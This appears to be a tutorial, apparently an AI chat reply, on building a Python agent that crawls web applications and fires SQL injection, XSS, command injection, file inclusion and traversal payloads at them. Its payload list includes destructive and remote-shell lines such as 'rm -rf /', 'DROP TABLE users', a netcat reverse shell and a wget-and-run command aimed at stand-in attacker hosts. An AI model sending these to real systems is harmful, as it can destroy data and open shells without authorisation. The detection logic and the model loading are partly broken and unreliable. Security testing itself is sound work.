---
title: "Implement a AI agent for bug hunting"
tags:
  - MachineLearning
---

***How to implement a deliberative AI agent for web application bug hunting purposes***

Implementing a deliberative AI agent for web application bug hunting involves creating a system that combines **goal-oriented planning**, **decision-making**, and **automation** to identify vulnerabilities in web applications. Here’s how you can build it:

---

### **Step 1: Define Goals and Objectives**
The AI agent’s primary goals:
- Identify common vulnerabilities such as SQL Injection, XSS, CSRF, and IDOR.
- Prioritize findings based on severity.
- Provide actionable remediation suggestions.

---

### **Step 2: Architecture Design**
1. **Perception Module**:
   - Input: The web application’s URLs, forms, API endpoints, or an entire application map.
   - Tools: Web crawlers, request interceptors, and scanners.

2. **Decision-Making Module**:
   - Implements vulnerability detection logic.
   - Generates a plan to test the web application systematically.

3. **Action Module**:
   - Executes test cases (e.g., SQL injection payloads).
   - Analyzes responses for vulnerabilities.

---

### **Step 3: Technology Stack**
- **Backend**: Python with frameworks like Flask or FastAPI.
- **Libraries/Tools**:
  - **Requests**: For HTTP requests.
  - **BeautifulSoup/Selenium**: For web crawling.
  - **Burp Suite API/OWASP ZAP API**: For automated security scans.
  - **AI Models**: Fine-tuned LLMs (like GPT) for crafting payloads or analyzing results.

---

### **Step 4: Implement the Agent**

#### **1. Perception Module: Web Crawler**
The crawler collects information about the web application’s structure.

```python
from bs4 import BeautifulSoup
import requests

def crawl_website(base_url, max_depth=2):
    visited = set()
    to_visit = [(base_url, 0)]
    found_urls = []

    while to_visit:
        url, depth = to_visit.pop(0)
        if url in visited or depth > max_depth:
            continue
        visited.add(url)

        try:
            response = requests.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            found_urls.append(url)

            for link in soup.find_all('a', href=True):
                full_url = requests.compat.urljoin(base_url, link['href'])
                to_visit.append((full_url, depth + 1))
        except Exception as e:
            print(f"Error visiting {url}: {e}")

    return found_urls

# Example usage
urls = crawl_website("http://example.com")
print("Discovered URLs:", urls)
```

---

#### **2. Decision-Making Module: Vulnerability Detection**
The AI agent decides which tests to execute on each endpoint.

```python
import random

def detect_vulnerabilities(url):
    test_cases = {
        "sql_injection": ["' OR '1'='1", "'; DROP TABLE users; --"],
        "xss": ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"'],
    }

    vulnerabilities = {}
    for test_type, payloads in test_cases.items():
        for payload in payloads:
            response = requests.get(url, params={"input": payload})
            if payload in response.text:
                vulnerabilities[test_type] = f"Vulnerable with payload: {payload}"
                break
    return vulnerabilities

# Example usage
vulns = detect_vulnerabilities("http://example.com/test")
print("Detected Vulnerabilities:", vulns)
```

---

#### **3. Action Module: Automated Testing**
Execute actions planned by the decision-making module.

```python
def execute_tests(base_url, urls):
    results = {}
    for url in urls:
        vulns = detect_vulnerabilities(url)
        if vulns:
            results[url] = vulns
    return results

# Execute tests
results = execute_tests("http://example.com", urls)
print("Vulnerability Report:", results)
```

---

### **Step 5: Enhancing the Agent with AI**
Use AI for advanced planning and analysis:
- **Payload Generation**:
  Fine-tune an LLM (like GPT) to generate context-specific payloads.
  ```python
  from transformers import pipeline

  generator = pipeline("text-generation", model="gpt-3.5-turbo")
  payload = generator("Generate an SQL injection payload for login forms.", max_length=50)
  print("Generated Payload:", payload)
  ```

- **Response Analysis**:
  Use AI to detect anomalies or hints of vulnerability in server responses.

---

### **Step 6: Reporting**
Summarize findings for developers.

```python
import json

def generate_report(results):
    report = {"total_urls": len(results), "vulnerabilities": []}
    for url, vulns in results.items():
        for vuln_type, details in vulns.items():
            report["vulnerabilities"].append({
                "url": url,
                "type": vuln_type,
                "details": details
            })
    return json.dumps(report, indent=4)

# Generate and save report
report = generate_report(results)
with open("vulnerability_report.json", "w") as file:
    file.write(report)
print("Report generated!")
```

---

### **Step 7: Deploy as a Web Application**
Use Flask or FastAPI to create a simple UI for the AI agent.

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    base_url = data.get("base_url")
    urls = crawl_website(base_url)
    results = execute_tests(base_url, urls)
    report = generate_report(results)
    return jsonify(report)

if __name__ == '__main__':
    app.run(debug=True)
```

---

### **Step 8: Optimization and Scaling**
- **Concurrency**: Use `asyncio` or `multiprocessing` for faster scanning.
- **Cloud Deployment**: Deploy the agent on cloud platforms like AWS, GCP, or Azure.

---

This implementation creates a foundational deliberative AI agent for web application bug hunting. Would you like to extend or focus on any specific part, such as advanced AI integration or cloud deployment?
Here’s the updated `detect_vulnerabilities()` function with about 50 test cases spanning different types of vulnerabilities, including **SQL Injection**, **XSS**, **Command Injection**, **CSRF**, **File Inclusion**, and **Directory Traversal**. 

```python
def detect_vulnerabilities(url):
    test_cases = {
        "sql_injection": [
            "' OR '1'='1", 
            "' OR 1=1 --", 
            "'; DROP TABLE users; --", 
            "' AND 1=0 --", 
            "' UNION SELECT NULL, NULL --", 
            "' UNION SELECT username, password FROM users --", 
            "' OR 'a'='a", 
            "' OR 1=1#", 
            "\" OR \"1\"=\"1", 
            "'; EXEC xp_cmdshell('dir'); --"
        ],
        "xss": [
            '<script>alert("XSS")</script>', 
            '"><script>alert("XSS")</script>', 
            '"><svg/onload=alert(1)>', 
            '"><img src=x onerror=alert(1)>', 
            "<body onload=alert('XSS')>", 
            "<iframe src=javascript:alert('XSS')>", 
            '"><input type="text" onfocus="alert(1)">', 
            "'><button onclick=alert(1)>Click</button>", 
            "javascript:alert('XSS');", 
            '<svg><desc><![CDATA[</desc><script>alert("XSS")</script>]]></svg>'
        ],
        "command_injection": [
            "; ls", 
            "| whoami", 
            "&& cat /etc/passwd", 
            "|| ps aux", 
            "`id`", 
            "$(uname -a)", 
            "$(echo vulnerable)", 
            "$(rm -rf /)", 
            "&& nc -e /bin/bash attacker.com 1234", 
            "| wget http://malicious.com -O exploit.sh; bash exploit.sh"
        ],
        "csrf": [
            '<form action="/vulnerable_endpoint" method="POST"><input type="hidden" name="amount" value="1000"><input type="submit"></form>', 
            '<iframe src="http://vulnerable-site.com/transfer?amount=1000"></iframe>', 
            '<img src="http://vulnerable-site.com/transfer?amount=1000">',
            '<script>fetch("http://vulnerable-site.com/transfer", {method: "POST", body: "amount=1000"});</script>', 
            '<link rel="stylesheet" href="http://vulnerable-site.com/transfer?amount=1000">'
        ],
        "file_inclusion": [
            "../../../../etc/passwd", 
            "../../../../../var/www/html/index.php", 
            "../../../../windows/system32/drivers/etc/hosts", 
            "/etc/passwd", 
            "/proc/self/environ", 
            "file:///etc/shadow", 
            "php://filter/read=convert.base64-encode/resource=index.php", 
            "zip://path/to/zipfile#file.txt", 
            "data://text/plain;base64,SGVsbG8=", 
            "expect://id"
        ],
        "directory_traversal": [
            "../", 
            "../../", 
            "../../../", 
            "../../../../", 
            "../../../../etc/passwd", 
            "../../../../var/log/", 
            "../../../../windows/system32/", 
            "../../../../usr/bin/", 
            "../../../../boot.ini", 
            "../../../../.ssh/id_rsa"
        ]
    }

    vulnerabilities = {}
    for test_type, payloads in test_cases.items():
        for payload in payloads:
            try:
                response = requests.get(url, params={"input": payload}, timeout=5)
                if payload in response.text or "error" in response.text.lower() or "exception" in response.text.lower():
                    vulnerabilities[test_type] = f"Vulnerable with payload: {payload}"
                    break
            except Exception as e:
                vulnerabilities[test_type] = f"Error during testing: {e}"
    return vulnerabilities

# Example usage
vulns = detect_vulnerabilities("http://example.com/test")
print("Detected Vulnerabilities:", vulns)
```

---

### Key Points:
1. **SQL Injection**:
   - Covers simple and advanced payloads for testing error-based and union-based SQL injection.

2. **XSS**:
   - Includes various payloads for reflected, stored, and DOM-based XSS.

3. **Command Injection**:
   - Explores different OS-level command injection techniques using `;`, `|`, `&&`, and `$()`.

4. **CSRF**:
   - Simulates cases of forged requests exploiting GET and POST methods.

5. **File Inclusion**:
   - Covers local file inclusion (LFI), remote file inclusion (RFI), and special schemes like `php://` and `data://`.

6. **Directory Traversal**:
   - Tests varying levels of directory traversal and access to critical system files.

---

This version systematically covers a wide range of vulnerabilities while keeping the detection logic efficient. Would you like to extend this with dynamic payload generation or integrate AI for better payload customization?
